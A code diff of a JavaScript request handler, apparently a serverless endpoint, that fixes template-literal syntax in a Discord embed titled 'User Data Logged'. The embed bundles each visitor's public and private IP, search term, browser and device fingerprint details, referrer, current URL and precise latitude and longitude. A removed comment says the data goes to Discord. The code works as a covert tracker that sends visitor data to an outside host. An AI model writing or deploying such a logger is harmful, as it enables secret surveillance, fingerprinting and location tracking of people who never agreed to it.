@@ -32,39 +32,37 @@ export default async (req, res) => {
                 geoLocation // This is the new data coming from the front-end
             } = req.body;
 
-            // Get public IP from headers (proxy/IP forwarding)
             const publicIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
-            // Send information to Discord
             const logMessage = {
                 embeds: [
                     {
                         title: 'User Data Logged',
-                        description: 
-                            **Public IP:** \${publicIP || 'N/A'}\
-                            **Private IP:** \${ip || 'N/A'}\
-                            **Search Term:** \${searchTerm || 'No search term entered'}\
-                            **User Agent:** \${userAgent || 'N/A'}\
-                            **Browser Language:** \${browserLanguage || 'N/A'}\
-                            **Operating System:** \${osInfo || 'N/A'}\
-                            **Browser Version:** \${browserVersion || 'N/A'}\
-                            **Connection Type:** \${connectionType || 'N/A'}\
-                            **Time Zone:** \${timeZone || 'N/A'}\
-                            **Device Memory:** \${deviceMemory || 'N/A'} GB\
-                            **Hardware Concurrency:** \${hardwareConcurrency || 'N/A'}\
-                            **Pixel Ratio:** \${pixelRatio || 'N/A'}\
-                            **Online Status:** \${onlineStatus || 'N/A'}\
-                            **Viewport Size:** \${viewportWidth || 'N/A'} x ${viewportHeight || 'N/A'}\
-                            **Screen Resolution:** \${screenWidth || 'N/A'} x ${screenHeight || 'N/A'}\
-                            **Color Depth:** \${colorDepth || 'N/A'}\
-                            **Touch Support:** \${touchSupport || 'N/A'}\
-                            **Cookies Enabled:** \${cookiesEnabled || 'N/A'}\
-                            **Browser Plugins:** \${plugins || 'N/A'}\
-                            **Referrer URL:** \${referrer || 'No referrer'}\
-                            **Current URL:** \${currentURL || 'N/A'}\
-                            **Timestamp:** \${timestamp || new Date().toISOString()}\
-                            **Location (Latitude, Longitude):** \${geoLocation.latitude}, ${geoLocation.longitude}\
-                        ,
+                        description: `
+                            **Public IP:** ${publicIP || 'N/A'}
+                            **Private IP:** ${ip || 'N/A'}
+                            **Search Term:** ${searchTerm || 'No search term entered'}
+                            **User Agent:** ${userAgent || 'N/A'}
+                            **Browser Language:** ${browserLanguage || 'N/A'}
+                            **Operating System:** ${osInfo || 'N/A'}
+                            **Browser Version:** ${browserVersion || 'N/A'}
+                            **Connection Type:** ${connectionType || 'N/A'}
+                            **Time Zone:** ${timeZone || 'N/A'}
+                            **Device Memory:** ${deviceMemory || 'N/A'} GB
+                            **Hardware Concurrency:** ${hardwareConcurrency || 'N/A'}
+                            **Pixel Ratio:** ${pixelRatio || 'N/A'}
+                            **Online Status:** ${onlineStatus || 'N/A'}
+                            **Viewport Size:** ${viewportWidth || 'N/A'} x ${viewportHeight || 'N/A'}
+                            **Screen Resolution:** ${screenWidth || 'N/A'} x ${screenHeight || 'N/A'}
+                            **Color Depth:** ${colorDepth || 'N/A'}
+                            **Touch Support:** ${touchSupport || 'N/A'}
+                            **Cookies Enabled:** ${cookiesEnabled || 'N/A'}
+                            **Browser Plugins:** ${plugins || 'N/A'}
+                            **Referrer URL:** ${referrer || 'No referrer'}
+                            **Current URL:** ${currentURL || 'N/A'}
+                            **Timestamp:** ${timestamp || new Date().toISOString()}
+                            **Location (Latitude, Longitude):** ${geoLocation.latitude}, ${geoLocation.longitude}
+                        `,
                         color: 0x00FF00,
                         timestamp: new Date(),
                     },
